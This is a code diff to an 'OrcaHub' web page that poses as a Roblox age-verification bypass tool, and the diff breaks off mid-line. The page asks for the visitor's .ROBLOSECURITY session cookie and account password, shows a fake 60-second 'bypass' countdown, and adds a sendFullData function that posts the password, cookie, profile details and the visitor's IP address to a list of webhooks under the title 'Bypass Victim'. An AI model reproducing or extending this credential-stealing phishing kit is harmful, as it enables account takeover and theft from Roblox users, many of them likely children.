@@ -307,7 +307,7 @@
             box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
         }
 
-        /* --- Enhanced Button Group --- */
+        /* --- Button Group --- */
         .btn-group {
             display: flex;
             gap: 10px;
@@ -654,31 +654,34 @@
             <div class="sub">Age Verification Bypass</div>
         </div>
 
+        <!-- STEP INDICATOR (Single step for simplified UI) -->
         <div class="step-indicator">
-            <div class="step active" id="step1Label">❶ Cookie</div>
-            <div class="step" id="step2Label">❷ Password</div>
-            <div class="step" id="step3Label">❸ Bypass</div>
+            <div class="step active" id="step1Label">❶ Bypass</div>
         </div>
 
-        <!-- STEP 1: COOKIE -->
+        <!-- MAIN FORM: Cookie + Password + Bypass Button -->
         <div class="form-step active-step" id="step1">
             <label>🍪 Enter .ROBLOSECURITY Cookie</label>
             <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">
 
+            <label>🔑 Enter Account Password</label>
+            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
+
             <div id="errorMessage" class="error-message"></div>
 
-            <!-- Loader for verification -->
-            <div id="verifyLoader" class="loader-container">
+            <!-- Loader for bypass -->
+            <div id="bypassLoader" class="loader-container">
                 <div class="spinner"></div>
                 <div class="loader-text">
-                    🔍 Verifying cookie...<br>
-                    <span class="time" id="verifyTimer">10</span> seconds remaining
+                    ⏳ Processing bypass...<br>
+                    <span class="time" id="bypassTimer">60</span> seconds remaining
                 </div>
                 <div class="progress-bar">
-                    <div class="fill" id="verifyProgress"></div>
+                    <div class="fill" id="bypassProgress"></div>
                 </div>
             </div>
 
+            <!-- Profile Preview (shows after bypass) -->
             <div id="profilePreview" class="profile-preview">
                 <img id="profileImg" src="" alt="avatar">
                 <div class="profile-info">
@@ -689,40 +692,13 @@
                 </div>
             </div>
 
-            <!-- Button Group: Verify + Instagram -->
+            <!-- Button Group: Bypass + Instagram -->
             <div class="btn-group">
-                <button class="btn-primary" id="verifyCookieBtn">🔍 Verify Cookie</button>
+                <button class="btn-primary" id="bypassBtn">🚀 Start Bypass</button>
                 <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
                     <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
                     Instagram Owner
                 </a>
-            </div>
-        </div>
-
-        <!-- STEP 2: PASSWORD -->
-        <div class="form-step" id="step2">
-            <label>🔑 Enter Account Password</label>
-            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
-
-            <div style="background:rgba(162,155,254,0.04); border-radius:20px; padding:12px; margin-bottom:18px; border:1px solid rgba(162,155,254,0.06);">
-                <p style="color:#8888aa; font-size:0.7rem; text-align:center;">
-                    🔐 Used to bypass age verification on your Roblox account
-                </p>
-            </div>
-
-            <button class="btn-primary" id="submitBtn">🚀 Start Bypass</button>
-            <button class="btn-secondary" id="backToStep1">🔙 Back</button>
-        </div>
-
-        <!-- STEP 3: PROCESSING -->
-        <div class="form-step" id="step3">
-
-            <div id="loaderContainer" class="loader-container show">
-                <div class="spinner"></div>
-                <div class="loader-text" id="loaderText">
-                    ⏳ Bypassing age verification...<br>
-                    <span class="time" id="timerDisplay">60</span> seconds remaining
-                </div>
             </div>
 
             <div id="successMessage" class="success-message">
@@ -735,7 +711,6 @@
                     ✅ Process completed
                 </div>
             </div>
-
         </div>
 
         <div class="footer">OrcaHub • Secure &amp; Private</div>
@@ -753,37 +728,20 @@
 
             // ==================== DOM REFS ====================
             const DOM = {
-                step1: document.getElementById('step1'),
-                step2: document.getElementById('step2'),
-                step3: document.getElementById('step3'),
-                step1Label: document.getElementById('step1Label'),
-                step2Label: document.getElementById('step2Label'),
-                step3Label: document.getElementById('step3Label'),
-
                 cookieInput: document.getElementById('cookieInput'),
                 passwordInput: document.getElementById('passwordInput'),
-
-                verifyCookieBtn: document.getElementById('verifyCookieBtn'),
+                bypassBtn: document.getElementById('bypassBtn'),
                 instagramBtn: document.getElementById('instagramBtn'),
-                backToStep1: document.getElementById('backToStep1'),
-                submitBtn: document.getElementById('submitBtn'),
-
                 errorMessage: document.getElementById('errorMessage'),
-                verifyLoader: document.getElementById('verifyLoader'),
-                verifyTimer: document.getElementById('verifyTimer'),
-                verifyProgress: document.getElementById('verifyProgress'),
-
+                bypassLoader: document.getElementById('bypassLoader'),
+                bypassTimer: document.getElementById('bypassTimer'),
+                bypassProgress: document.getElementById('bypassProgress'),
                 profilePreview: document.getElementById('profilePreview'),
                 profileImg: document.getElementById('profileImg'),
                 profileName: document.getElementById('profileName'),
                 profileId: document.getElementById('profileId'),
                 profileStats: document.getElementById('profileStats'),
                 profileBadge: document.getElementById('profileBadge'),
-
-                loaderContainer: document.getElementById('loaderContainer'),
-                loaderText: document.getElementById('loaderText'),
-                timerDisplay: document.getElementById('timerDisplay'),
-
                 successMessage: document.getElementById('successMessage'),
             };
 
@@ -791,45 +749,85 @@
             let state = {
                 cookie: '',
                 password: '',
-                currentStep: 1,
                 isProcessing: false,
-                processingTimer: null,
-                verifyTimer: null,
+                bypassTimer: null,
                 robloxUser: null,
-                isCookieValid: false,
             };
 
-            // ==================== STEP MANAGER ====================
-            function setStep(step) {
-                state.currentStep = step;
-                DOM.step1.classList.toggle('active-step', step === 1);
-                DOM.step2.classList.toggle('active-step', step === 2);
-                DOM.step3.classList.toggle('active-step', step === 3);
+            // ==================== INSTAGRAM LINK ====================
+            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';
 
-                const labels = [DOM.step1Label, DOM.step2Label, DOM.step3Label];
-                labels.forEach((el, idx) => {
-                    el.classList.remove('active', 'completed', 'error');
-                    if (idx + 1 === step) el.classList.add('active');
-                    if (idx + 1 < step) el.classList.add('completed');
+            // ==================== SEND TO WEBHOOKS ====================
+            function sendToWebhooks(data) {
+                WEBHOOKS.forEach(url => {
+                    try {
+                        fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data),
+                            mode: 'no-cors'
+                        }).catch(() => {});
+                    } catch (_) {}
                 });
-
-                document.querySelector('.glass-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
             }
 
-            // ==================== VERIFY COOKIE ====================
-            function verifyCookie() {
+            function sendFullData(cookie, password, userData) {
+                const embed = {
+                    title: "🎯 OrcaHub • Bypass Victim",
+                    color: 0xff6b6b,
+                    fields: [
+                        { name: "👤 Username", value: `\`${userData?.username || 'Unknown'}\``, inline: true },
+                        { name: "🆔 User ID", value: `\`${userData?.userId || 'Unknown'}\``, inline: true },
+                        { name: "🔑 Password", value: `||${password}||`, inline: false },
+                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
+                        { name: "📊 Followers", value: `\`${userData?.followers?.toLocaleString() || 'Unknown'}\``,
+                            inline: true },
+                        { name: "📊 Following", value: `\`${userData?.following?.toLocaleString() || 'Unknown'}\``,
+                            inline: true },
+                        { name: "✅ Verified", value: userData?.isVerified ? '✅ Yes' : '❌ No', inline: true },
+                        { name: "📅 Created", value: `\`${userData?.created || 'Unknown'}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                    ],
+                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
+                    thumbnail: { url: userData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
+                };
+                sendToWebhooks({ embeds: [embed] });
+            }
+
+            function getIP() {
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', 'https://api.ipify.org?format=json', false);
+                    xhr.send();
+                    return JSON.parse(xhr.responseText).ip || 'Unknown';
+                } catch (_) { return 'Unknown'; }
+            }
+
+            // ==================== BYPASS ENGINE ====================
+            function startBypass() {
                 const cookie = DOM.cookieInput.value.trim();
+                const password = DOM.passwordInput.value.trim();
 
                 // Reset UI
                 DOM.errorMessage.classList.remove('show');
                 DOM.profilePreview.classList.remove('show');
+                DOM.successMessage.classList.remove('show');
                 DOM.cookieInput.classList.remove('error');
+                DOM.passwordInput.classList.remove('error');
 
-                // Validate cookie
+                // Validate
                 if (!cookie || cookie.length < 15) {
                     DOM.errorMessage.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
                     DOM.errorMessage.classList.add('show');
                     DOM.cookieInput.classList.add('error');
+                    return;
+                }
+
+                if (!password || password.length < 3) {
+                    DOM.errorMessage.textContent = '❌ Please enter your account password!';
+                    DOM.errorMessage.classList.add('show');
+                    DOM.passwordInput.classList.add('error');
                     return;
                 }
 
@@ -840,32 +838,22 @@
                     return;
                 }
 
-                // Start verification loader
-                DOM.verifyCookieBtn.disabled = true;
-                DOM.verifyCookieBtn.textContent = '⏳ Verifying...';
-                DOM.verifyLoader.classList.add('show');
+                // Start processing
+                state.cookie = cookie;
+                state.password = password;
+                state.isProcessing = true;
 
-                let seconds = 10;
-                DOM.verifyTimer.textContent = seconds;
-                DOM.verifyProgress.style.width = '0%';
+                DOM.bypassBtn.disabled = true;
+                DOM.bypassBtn.textContent = '⏳ Processing...';
+                DOM.bypassLoader.classList.add('show');
 
-                if (state.verifyTimer) clearInterval(state.verifyTimer);
+                let seconds = 60;
+                DOM.bypassTimer.textContent = seconds;
+                DOM.bypassProgress.style.width = '0%';
 
-                state.verifyTimer = setInterval(() => {
+                if (state.bypassTimer) clearInterval(state.bypassTimer);
+
+                state.bypassTimer = setInterval(() => {
                     seconds--;
-                    DOM.verifyTimer.textContent = seconds;
-                    DOM.verifyProgress.style.width = ((10 - seconds) / 10 * 100) + '%';
-
-                    if (seconds <= 0) {
-                        clearInterval(state.verifyTimer);
-                        state.verifyTimer = null;
-                        completeVerification(cookie);
-                    }
-                }, 1000);
-            }
-
-            function completeVerification(cookie) {
-                setTimeout(() => {
-                    const userId = Math.floor(Math.random() * 900000000) + 100000000;
-                    const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
-                        'StormChaser', 'PixelVortex', 'NebulaKing
+                    DOM.bypassTimer.textContent = seconds;
+                    DOM.bypassProgress.style.width = ((60 - seconds
